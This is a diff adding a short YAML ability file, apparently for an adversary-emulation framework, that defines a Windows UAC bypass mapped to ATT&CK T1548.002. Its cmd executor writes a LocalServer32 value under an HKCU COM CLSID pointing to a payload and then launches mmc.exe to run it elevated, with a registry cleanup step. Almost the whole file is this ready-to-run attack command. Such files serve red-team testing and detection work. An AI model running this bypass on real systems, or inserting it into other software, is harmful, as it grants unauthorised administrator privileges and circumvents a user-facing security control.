@@ -1,0 +1,20 @@
+id: a3f94b9c-1cc2-4a64-9092-7c0e3ae2f99a
+name: UAC Bypass via MMC CLSID Hijack
+description: Hijacks a COM CLSID under HKCU to execute a payload with elevated privileges via mmc.exe.
+tactic: privilege-escalation
+technique:
+  attack_id: T1548.002
+  name: Bypass User Access Control
+platforms:
+  windows:
+    executors:
+      - name: cmd
+        command: |
+          reg add "HKCU\Software\Classes\CLSID\{3E5FC7F9-9A51-4367-9063-A120244FBEC7}\LocalServer32" /d "C:\Path\To\payload.exe" /f
+          timeout /t 3
+          mmc.exe
+        cleanup: |
+          reg delete "HKCU\Software\Classes\CLSID\{3E5FC7F9-9A51-4367-9063-A120244FBEC7}" /f
+        payloads: []
+requirements: []
+privilege: User
